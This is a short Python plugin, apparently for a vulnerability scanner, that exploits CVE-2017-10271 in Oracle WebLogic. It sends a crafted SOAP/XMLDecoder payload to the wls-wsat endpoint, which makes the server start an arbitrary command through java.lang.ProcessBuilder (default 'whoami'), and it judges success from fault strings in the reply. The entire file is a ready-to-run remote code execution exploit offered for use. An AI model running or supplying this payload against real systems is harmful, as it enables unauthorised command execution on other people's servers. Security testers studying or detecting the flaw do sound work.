#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# 该漏洞不会直接回显
# 这里根据响应的错误内容确认是否执行成功，可能会出现错漏的情况，需人工确认
# updated 2019/10/30
# by 0xn0ne

from stars import universe, Star, target_type
from utils import http

headers = {
    'Content-Type': 'text/xml;charset=UTF-8',
    'User-Agent': 'TestUA/1.0'
}


@universe.groups()
class CVE_2017_10271(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2017-10271',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, cmd='whoami', *args, **kwargs) -> (bool, dict):
        url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
        t_data = ''
        for i, c in enumerate(cmd.split()):
            t_data += '<void index="{}"><string>{}</string></void>'.format(i, c)
        data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                {}
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''.format(t_data)
        res, data = http(url, 'POST', data=data, timeout=3, headers=headers, ssl=force_ssl)
        if res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text):
            return True, {'msg': 'finish.'}
        return False, {'msg': 'finish.'}
